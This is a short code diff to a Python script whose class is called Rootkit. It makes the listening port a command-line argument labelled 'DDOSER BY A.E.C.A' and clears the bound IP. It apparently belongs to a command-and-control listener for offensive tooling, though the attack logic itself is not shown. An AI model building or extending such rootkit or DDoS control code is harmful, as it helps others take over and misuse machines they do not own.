@@ -2,12 +2,13 @@ import socket
 from console_progressbar import ProgressBar
 import time 
 import ast 
-
+import argparse
+from colorama import Fore, Back
 
 class Rootkit:
 
     def __init__(self, port):
-        self.ip = socket.gethostbyname(socket.gethostname())
+        self.ip = ""
         self.port = port 
         self.s = socket.socket()
         self.pb = ProgressBar(total=100,prefix='', suffix='Now', decimals=3, length=50, fill='X', zfill='-')
@@ -110,8 +111,11 @@ class Rootkit:
             else:
                 continue
 
+parser = argparse.ArgumentParser(description = "DDOSER BY A.E.C.A")
+parser.add_argument("port",help="Target open port")
+args = parser.parse_args()
 
-root = Rootkit(8080)
+root = Rootkit(int(args.port))
 root.print_copyright()
 root.bind_server()
 root.get_command()
